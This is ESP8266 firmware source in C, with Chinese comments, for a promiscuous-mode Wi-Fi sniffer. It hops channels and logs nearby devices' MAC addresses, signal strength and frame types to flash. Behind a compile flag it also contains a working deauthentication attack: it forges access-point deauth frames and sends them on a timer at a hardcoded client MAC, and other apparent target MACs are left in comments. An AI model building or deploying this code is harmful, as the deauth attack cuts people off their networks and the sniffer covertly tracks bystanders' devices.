/*
 * sniffer.c
 */


#include "sniffer.h"

#include "driver/uart.h"
#include "user_config.h"
#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "mem.h"
#include "user_interface.h"
#include "sniffer.h"

#if DEAUTH_ENABLE
static volatile os_timer_t deauth_timer;
#endif
#if HOP_JUMP_ENABLE
static os_timer_t channelHop_timer;
#endif

// Channel to perform deauth
uint8_t channel = 1;

// Access point MAC to deauth
uint8_t ap[6] = {0x00,0x01,0x02,0x03,0x04,0x05};

// Client MAC to deauth
//uint8_t client[6] = {0xc4, 0x6a, 0xb7, 0x9f, 0xcc, 0x34};
//uint8_t client[6] = {0xb8, 0x94, 0x36, 0x1c, 0x96, 0xab};
uint8_t client[6] = {0xfc, 0xc3, 0x9e, 0x5a, 0x1c, 0xfe};
//FC:c3:9e:5a:1c:fe

// Sequence number of a packet from AP to client
uint16_t seq_n = 0;

// Packet buffer
uint8_t packet_buffer[64];

uint8_t temp_mac[10][6];
uint8_t temp_mac1[6] = {0xc4, 0x6a, 0xb7, 0x9f, 0xcc, 0x34};

uint8_t broad_mac[6]={0xff,0xff,0xff,0xff,0xff,0xff};
uint8_t mstore[1024*10]={0};


// Get STA MAC address
#define STATION_IF 0x00
#define SOFTAP_IF 0x01
char staMacAddr[17];





#if HOP_JUMP_ENABLE
void ICACHE_FLASH_ATTR
channelHop(void *arg)
{
    // 1 - 13 channel hopping
   // uint8 new_channel = wifi_get_channel() % 12 + 1;
   static uint8 new_channel = 1;
	new_channel++;
	if(new_channel >13)
		new_channel = 1;
    //os_printf("** hop to %d **\t    Client MAC\t\t    AP MAC\r\n", new_channel);
    wifi_set_channel(new_channel);
}
#endif

#if DEAUTH_ENABLE
/* Creates a deauth packet.
 *
 * buf - reference to the data array to write packet to;
 * client - MAC address of the client;
 * ap - MAC address of the acces point;
 * seq - sequence number of 802.11 packet;
 *
 * Returns: size of the packet
 */
uint16_t ICACHE_FLASH_ATTR
deauth_packet(uint8_t *buf, uint8_t *client, uint8_t *ap, uint16_t seq)
{
    int i=0;

    // Type: deauth
    buf[0] = 0xC0;
    buf[1] = 0x00;
    // Duration 0 msec, will be re-written by ESP
    buf[2] = 0x00;
    buf[3] = 0x00;
    // Destination
    for (i=0; i<6; i++) buf[i+4] = client[i];
    // Sender
    for (i=0; i<6; i++) buf[i+10] = ap[i];
    for (i=0; i<6; i++) buf[i+16] = ap[i];
    // Seq_n
    buf[22] = seq % 0xFF;
    buf[23] = seq / 0xFF;
    // Deauth reason
    buf[24] = 1;
    buf[25] = 0;
    return 26;
}

/* Sends deauth packets. */
void ICACHE_FLASH_ATTR
deauth(void *arg)
{
    os_printf("\nSending deauth seq_n = %d ...\n", seq_n/0x10);
    // Sequence number is increased by 16, see 802.11
    uint16_t size = deauth_packet(packet_buffer, client, ap, seq_n+0x10);
    wifi_send_pkt_freedom(packet_buffer, size, 0);
}
#endif


#define IRAM_ATTR	__attribute__((section(".text")))

/* Listens communication between AP and client */
static void IRAM_ATTR
promisc_cb(uint8_t *buf, uint16_t len)
{//os_printf("s\r\n");
    static long count =0;
	int leni,i;
	static int temp_count=0;
	struct framecontrol_t *framecontrol;
	struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
	/*for(leni=0; leni<len;leni++){
			os_printf("0x%x ", buf[leni]);

	}*/
	

	
    if (len == 12){
		return;
    }  else {//大于12的帧
		//拿到802.11的头
		//os_printf("len=%d",len);


//return;
		framecontrol = (struct framecontrol_t*)(&buf[12]);
		//os_printf("%d|%d|%d\n",framecontrol->frametype, framecontrol->subtype,framecontrol->datadir);




//控制帧暂时判断不了发送和接受，谁都可以发送和接受
//		if(framecontrol->frametype == FRAME_MANAGE)
	//			return;
		//if(framecontrol->frametype == FRAME_DATA)
			//	return;


#define PASS_10 0
#if PASS_10
		// 如果MAC地址和上一次一样就返回
		for(i=0; i<5; i++){
			if(0==os_memcmp(temp_mac[i], &sniffer->buf[4], 6)){
				return;
			}
		}

		// 缓存上次的MAC，避免重复打印
		for (i=0; i<6; i++){
			temp_mac[temp_count][i] = sniffer->buf[i+4];
		}
		temp_count++;
		if(temp_count == 5){
			temp_count=0;
		}
#endif
		
		// os_printf("len=%5d 0x%2x ", len, buf[12]);
		switch(framecontrol->frametype){
			case FRAME_MANAGE://00
				//os_printf("FRAME_MANAGE  subtype=%d",framecontrol->subtype);

				//os_printf("BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",PRINT(sniffer->buf,16));

				if(framecontrol->subtype == SUBTYPE_PRBREQ \
					|| framecontrol->subtype == SUBTYPE_ASSREQ)//00|0d  00|00
					//|| framecontrol->subtype == SUBTYPE_ACTION 00|13 判断不了发送和接受端
					goto printDS;
				else if(framecontrol->subtype == SUBTYPE_RESREP)
					goto printSD;
				//认证的时候，ap也会发送数据，需要通过BSSID判断发送方
				else if(framecontrol->subtype == SUBTYPE_AUTH || framecontrol->subtype == SUBTYPE_ACTION){
					//os_printf("BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",PRINT(sniffer->buf,16));
					if(os_memcmp(&sniffer->buf[4], &sniffer->buf[16], 6)){
						goto printSD;
					}else
						goto printDS;
				}
				return;
				break;
			case FRAME_CONTROL://01
				return;
				//os_printf("FRAME_CONTROL "); //01|09(BlockAck) 01|08
				//if(framecontrol->subtype == 9 || framecontrol->subtype == 8)
				{
						goto printSD;
				}
				
				break;
			case FRAME_DATA://02  //02|00  
				{
						//ap发出的帧,可以用来当作探针数据
						//datadir为0时为IBSS，设备都是对等的，无需此模式;为3时是WDS中继，也不需要的
						if(framecontrol->datadir == DATA_DIR_FROMAP){
							//ap广播，我们需要将其过滤
							if(0==os_memcmp(broad_mac, &sniffer->buf[4], 6))
								return;
							else
								goto printSD;
						}else if(framecontrol->datadir == DATA_DIR_TOAP){
							goto printDS;
						}
				}
				return;
				os_printf("FRAME_DATA    ");
				break;
			case FRAME_RESERVED:
				return;
				os_printf("FRAME_RESERVED");
				break;
		}
		//mac address

    	}


		//打印本机stamac
  			// 缓存上次的MAC，避免重复打印
printDS:
		//if(0!=sniffer->buf[10]%4)//如果不能被4整除除，那就不是我们需要的mac
		//	return;
		// 如果MAC地址和上一次一样就返回
		if(0==os_memcmp(temp_mac1, &sniffer->buf[10], 6)){
			return;
		}
		for (i=0; i<6; i++){
			temp_mac1[i] = sniffer->buf[i+10];
		}
		//check 真实mac地址
		//os_printf("\r\n");

/*		os_printf("%02X:%02X:%02X:%02X:%02X:%02X|%02X:%02X:%02X:%02X:%02X:%02X|%02X:%02X:%02X:%02X:%02X:%02X|%02d|%02d|%d|%d|0|%d|0\n",\
		PRINT(staMacAddr,0),PRINT(sniffer->buf,10),PRINT(sniffer->buf,4),\
		framecontrol->frametype, framecontrol->subtype, sniffer->rx_ctrl.channel, sniffer->rx_ctrl.rssi,framecontrol->datadir);
*/		os_sprintf(mstore,"%02X:%02X:%02X:%02X:%02X:%02X|%02X:%02X:%02X:%02X:%02X:%02X|%02d|%02d|%02d|%d|0|%d|0\n",\
		PRINT(sniffer->buf,10),PRINT(sniffer->buf,4),\
		framecontrol->frametype, framecontrol->subtype, sniffer->rx_ctrl.channel, sniffer->rx_ctrl.rssi,framecontrol->datadir);
		os_printf(mstore);
		writeSniffDataToFlash(mstore);

		//os_printf("e\r\n");
		return;


				
		 		// 缓存上次的MAC，避免重复打印
printSD:
		//if(0!=sniffer->buf[4]%4)//如果不能被4整除除，那就不是我们需要的mac
		//	return;
		if(0==os_memcmp(temp_mac1, &sniffer->buf[4], 6)){
			return;
		}
		for (i=0; i<6; i++){
			temp_mac1[i] = sniffer->buf[i+4];
		}
	/*	os_printf("%02X:%02X:%02X:%02X:%02X:%02X|%02X:%02X:%02X:%02X:%02X:%02X|%02X:%02X:%02X:%02X:%02X:%02X|%02d|%02d|%d|%d|0|%d|0\n",\
		PRINT(staMacAddr,0),PRINT(sniffer->buf,4),PRINT(sniffer->buf,10),\
		framecontrol->frametype, framecontrol->subtype, sniffer->rx_ctrl.channel, sniffer->rx_ctrl.rssi,framecontrol->datadir);
		*/

		os_sprintf(mstore,"%02X:%02X:%02X:%02X:%02X:%02X|%02X:%02X:%02X:%02X:%02X:%02X|%02d|%02d|%02d|%d|0|%d|0\n",\
				PRINT(sniffer->buf,4),PRINT(sniffer->buf,10),\
				framecontrol->frametype, framecontrol->subtype, sniffer->rx_ctrl.channel, sniffer->rx_ctrl.rssi,framecontrol->datadir);

		os_printf(mstore);
		writeSniffDataToFlash(mstore);
		return;


	printmac(staMacAddr, 0);//打印本机stamac
		
				os_printf("|");
				printmac(sniffer->buf, 4);//SA
				os_printf("|");
				printmac(sniffer->buf, 10);//DA
				os_printf("|");
				//printmac(sniffer->buf, 16);
				os_printf("%02d|%02d|", framecontrol->frametype, framecontrol->subtype);
				os_printf("%d|%d|0|0|0\n", sniffer->rx_ctrl.channel, sniffer->rx_ctrl.rssi );
				return; 
}


/*
void printTZ(char *sniff,char *frame, char ds){
	os_printf("%02X:%02X:%02X:%02X:%02X:%02X|%02X:%02X:%02X:%02X:%02X:%02X|%02X:%02X:%02X:%02X:%02X:%02X|%02d|%02d|%d|%d|0|0|0\n",\
		PRINT(staMacAddr,0),PRINT(sniffer->buf,10),PRINT(sniffer->buf,4),\
		framecontrol->frametype, framecontrol->subtype, sniffer->rx_ctrl.channel, sniffer->rx_ctrl.rssi);
}*/

void ICACHE_FLASH_ATTR
sniffer_init(void)
{
    // Promiscuous works only with station mode
    wifi_set_opmode(STATION_MODE);
#if DEAUTH_ENABLE
    // Set timer for deauth
    os_timer_disarm(&deauth_timer);
    os_timer_setfn(&deauth_timer, (os_timer_func_t *) deauth, NULL);
    os_timer_arm(&deauth_timer, CHANNEL_HOP_INTERVAL, 1);
#endif

#if HOP_JUMP_ENABLE
    os_timer_disarm(&channelHop_timer);
    os_timer_setfn(&channelHop_timer, (os_timer_func_t *) channelHop, NULL);
    os_timer_arm(&channelHop_timer, CHANNEL_HOP_INTERVAL, 1);
#endif
	wifi_get_macaddr(STATION_IF, staMacAddr);

}
void ICACHE_FLASH_ATTR
diable_channel_hop(){
	os_timer_disarm(&channelHop_timer);
}

void ICACHE_FLASH_ATTR
sniffer_init_in_system_init_done(void)
{
    // Set up promiscuous callback
    wifi_set_channel(1);
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_enable(1);
    //u8 mac[6] = {0xfc, 0xc3, 0x9e, 0x5a, 0x1c, 0xfe};
    //wifi_promiscuous_set_mac(mac);
    os_printf("----------sniffer\n");
	os_printf("system_get_rtc_time =%d\n",system_get_rtc_time());
	os_printf("system_get_rtc_time =%d\n",system_get_time());
}

